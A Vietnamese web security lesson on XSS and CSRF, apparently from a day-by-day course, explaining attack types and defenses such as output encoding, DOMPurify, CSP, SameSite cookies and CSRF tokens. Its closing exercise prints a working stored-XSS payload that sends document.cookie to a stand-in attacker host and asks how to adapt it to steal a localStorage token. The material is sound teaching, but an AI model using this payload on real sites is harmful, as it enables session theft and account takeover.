---
title: "Ngày 9: Web Security (Phần 2) - Cross-Site Scripting (XSS) & Cross-Site Request Forgery (CSRF)"
description: "Làm chủ hai lỗ hổng client-side nguy hiểm bậc nhất: Cross-Site Scripting và Cross-Site Request Forgery. Học cách phòng chống bằng Cookie HttpOnly, DOMPurify, CSP và CSRF Token."
---

# Ngày 9: Web Security (Phần 2) - Cross-Site Scripting (XSS) & CSRF

Hôm qua chúng ta đã học cách bảo vệ cơ sở dữ liệu ở phía Backend khỏi SQL Injection. Hôm nay, chúng ta sẽ chuyển dịch tiêu điểm sang phía **Client-side (Trình duyệt của người dùng)** để nghiên cứu hai lỗ hổng bảo mật vô cùng nguy hiểm chuyên nhắm vào người dùng cuối: **Cross-Site Scripting (XSS)** và **Cross-Site Request Forgery (CSRF)**.

Đây là hai lỗ hổng có thể giúp hacker chiếm đoạt hoàn toàn tài khoản người dùng, mạo danh họ thực hiện giao dịch chuyển tiền hoặc biến trang web của bạn thành công cụ phát tán mã độc.

---

## 1. Cross-Site Scripting (XSS) là gì?

**XSS (Cross-Site Scripting)** xảy ra khi một ứng dụng web nhận dữ liệu độc hại từ người dùng, sau đó hiển thị dữ liệu đó lên trang web mà không qua lọc bỏ mã độc hay mã hóa đầu ra (Escaping/Sanitization). Trình duyệt của nạn nhân khi tải trang sẽ tưởng lầm mã độc này là mã Javascript hợp pháp của trang web và tự động thực thi nó.

```text
Mô hình tấn công XSS đánh cắp Session Cookie:

[ Hacker ] ──(1) Gửi mã độc <script> ──> [ Web Server (Bị lỗi XSS) ]
                                                    │
                                           (2) Lưu/Hiển thị mã độc
                                                    │
                                                    ▼
[ Nạn nhân ] <──(3) Trình duyệt chạy mã độc ─── [ Trang Web ]
     │
  (4) Gửi Cookie nhạy cảm tự động
     │
     ▼
[ Server của Hacker ] (Đánh cắp tài khoản thành công!)
```

### 3 phân loại chính của XSS:

1.  **Stored XSS (Persistent XSS):** Lỗi XSS nguy hiểm nhất. Mã độc Javascript được hacker gửi lên server và lưu trữ vĩnh viễn trong database (ví dụ: trong bài viết blog, bình luận, hoặc tên hồ sơ). Mỗi khi có người dùng bất kỳ truy cập vào trang đó, trình duyệt của họ sẽ tải mã độc này từ DB về và thực thi.
2.  **Reflected XSS (Non-Persistent XSS):** Mã độc được gửi kèm trong chính đường link URL (ví dụ tham số tìm kiếm `?q=<script>...`). Khi nạn nhân click vào link độc hại này, server nhận yêu cầu, đưa mã độc đó vào trang phản hồi và gửi trả lại trình duyệt nạn nhân để thực thi ngay lập tức.
3.  **DOM-based XSS:** Lỗ hổng xảy ra hoàn toàn dưới client-side mà không cần gửi dữ liệu lên server. Mã Javascript của trang web ở client xử lý dữ liệu từ một nguồn không an toàn (như `location.hash` hay `document.referrer`) và ghi trực tiếp vào DOM qua các hàm nguy hiểm như `element.innerHTML` hay `eval()`.

### Hacker làm được gì khi chạy được mã Javascript trên máy nạn nhân?
*   Đọc và gửi trộm **Session Cookies** hoặc **Local Storage** chứa Token đăng nhập của nạn nhân về server của hacker.
*   Thay đổi giao diện trang web (phát tán form đăng nhập giả để phish tài khoản).
*   Mạo danh nạn nhân gửi tin nhắn, viết bài viết hoặc thực hiện các thao tác thay đổi mật khẩu âm thầm.

---

## 2. Giải pháp phòng chống XSS triệt để

Để bảo vệ ứng dụng khỏi XSS, ta phải áp dụng chiến lược phòng thủ chiều sâu (Defense-in-Depth):

### Giải pháp A: Output Encoding (Mã hóa đầu ra)
Trước khi hiển thị bất kỳ dữ liệu động nào từ người dùng lên HTML, hãy chuyển đổi các ký tự đặc biệt của HTML thành các thực thể an toàn (HTML Entities):

```text
Ký tự gốc   ──>   HTML Entity an toàn
   <        ──>        &lt;
   >        ──>        &gt;
   &        ──>        &amp;
   "        ──>        &quot;
   '        ──>        &#x27;
```

Nếu dữ liệu là `<script>`, sau khi mã hóa sẽ hiển thị thô là `&lt;script&gt;` dưới dạng văn bản thuần chứ trình duyệt không bao giờ biên dịch nó thành mã code thực thi.
*   *Lưu ý:* Các framework hiện đại như **React (JSX)** hay **Vue.js** đã tự động mã hóa đầu ra mặc định. Tuy nhiên, nếu bạn sử dụng các thuộc tính chèn HTML trực tiếp như `dangerouslySetInnerHTML` trong React, bạn sẽ làm mất đi lớp bảo vệ này.

### Giải pháp B: HTML Sanitization (Lọc sạch HTML)
Nếu ứng dụng của bạn bắt buộc phải cho phép người dùng nhập mã HTML (ví dụ trình soạn thảo văn bản Rich Text Editor để viết blog), bạn phải sử dụng thư viện lọc sạch chuyên nghiệp như **DOMPurify** ở cả Client và Backend để loại bỏ các thẻ nguy hiểm (`<script>`, `<iframe>`) và các thuộc tính kích hoạt sự kiện (`onload`, `onerror`, `onclick`).

```javascript
import DOMPurify from 'dompurify';

// Lọc sạch dữ liệu trước khi chèn vào trang
const safeHTML = DOMPurify.sanitize(userProvidedHTML);
```

### Giải pháp C: Content Security Policy (CSP)
**CSP** là một Header phản hồi từ server cho phép bạn định cấu hình rõ ràng các nguồn tài nguyên (Javascript, CSS, hình ảnh, kết nối API) nào trình duyệt được phép tải và thực thi.
*   Nếu hacker chèn được thẻ `<script src="http://hacker.com/malware.js">`, nhưng CSP của bạn chỉ cấu hình chỉ cho phép chạy script từ chính domain của bạn (`default-src 'self'`), trình duyệt sẽ chặn đứng việc tải mã độc của hacker!

---

## 3. Cross-Site Request Forgery (CSRF) là gì?

**CSRF (Tấn công mạo danh yêu cầu qua trang web chéo)** là kỹ thuật tấn công ép buộc trình duyệt của nạn nhân gửi một yêu cầu HTTP độc hại (đã tự động đính kèm Cookie định danh) tới ứng dụng web đích mà nạn nhân đã đăng nhập từ trước.

```text
Kịch bản tấn công CSRF:

1. Nạn nhân đăng nhập thành công vào [ Bank.com ] và được cấp Session Cookie.
2. Nạn nhân vô tình mở tab mới và truy cập trang web giải trí độc hại [ Evil.com ] của hacker.
3. [ Evil.com ] chứa một đoạn mã tự động gửi yêu cầu chuyển tiền ngầm:
   POST to Bank.com/api/transfer { to: "Hacker", amount: 1000 }
4. Trình duyệt tự động đính kèm Cookie của Bank.com vào yêu cầu này.
5. [ Bank.com ] thấy Cookie hợp lệ và thực hiện chuyển tiền của nạn nhân sang hacker!
```

---

## 4. Giải pháp phòng chống CSRF

### Giải pháp 1: Cấu hình Cookie SameSite (Khuyên dùng tốt nhất 2026)
Hầu hết các trình duyệt hiện đại năm 2026 đều hỗ trợ thuộc tính thuộc tính Cookie `SameSite`. Thuộc tính này điều khiển việc trình duyệt có được phép tự động đính kèm Cookie khi gửi yêu cầu xuất phát từ một trang web khác hay không.

Bạn nên cấu hình Cookie lưu Session/Token đăng nhập với các cờ bảo mật sau:
*   `HttpOnly`: Chặn tuyệt đối mã Javascript truy cập vào Cookie (Chặn đứng nguy cơ XSS đánh cắp Session Cookie).
*   `Secure`: Chỉ gửi Cookie qua kết nối HTTPS bảo mật.
*   `SameSite=Lax` hoặc `SameSite=Strict`: Chặn không cho gửi kèm Cookie trong các yêu cầu chéo trang (Cross-site requests), giúp triệt tiêu hoàn toàn nguy cơ CSRF!

```javascript
// Cấu hình Session Cookie an toàn trong Express
res.cookie('session_token', token, {
    httpOnly: true,     // Chống XSS đọc trộm cookie
    secure: true,       // Chỉ truyền qua HTTPS
    sameSite: 'strict', // Chống CSRF tuyệt đối
    maxAge: 3600000     // 1 giờ
});
```

### Giải pháp 2: Sử dụng CSRF Token
Đối với các ứng dụng cũ hoặc các API nhạy cảm, người ta sinh ra một chuỗi ký tự ngẫu nhiên, duy nhất và cực kỳ khó đoán gọi là **CSRF Token** khi người dùng tải trang form. Token này được lưu ở server và nhúng vào Form ở Client. Khi gửi yêu cầu POST/PUT, client phải đính kèm Token này trong Body hoặc Header.
*   Vì trang web độc hại của hacker không thể đọc được nội dung trên trang của bạn (do vướng quy tắc bảo mật Same-Origin Policy của trình duyệt), hacker sẽ không thể biết CSRF Token để đính kèm, và yêu cầu giả mạo sẽ bị server từ chối ngay lập tức!

---

## 📝 Bài tập nhỏ cuối ngày: Phân tích mã độc

Dưới đây là một đoạn payload được tìm thấy trong ô bình luận của một trang mạng xã hội bị lỗi bảo mật Stored XSS:

```html
<img src="does-not-exist.jpg" onerror="fetch('https://attacker-collect.com/log?cookie=' + encodeURIComponent(document.cookie))">
```

### Yêu cầu:
1.  Hãy phân tích từng thành phần của đoạn mã trên: Cơ chế hoạt động của nó là gì? Tại sao hacker lại sử dụng thẻ `<img>` kết hợp thuộc tính `onerror` thay vì thẻ `<script>`?
2.  Nếu hệ thống của chúng ta sử dụng cơ chế lưu trữ JWT Token trong `localStorage` thay vì Cookie, hacker có thể sửa đoạn mã trên như thế nào để lấy cắp JWT Token?
3.  Hãy đưa ra 2 biện pháp kỹ thuật cụ thể mà bạn sẽ áp dụng cho dự án của mình để vô hiệu hóa hoàn toàn đoạn payload phá hoại này.
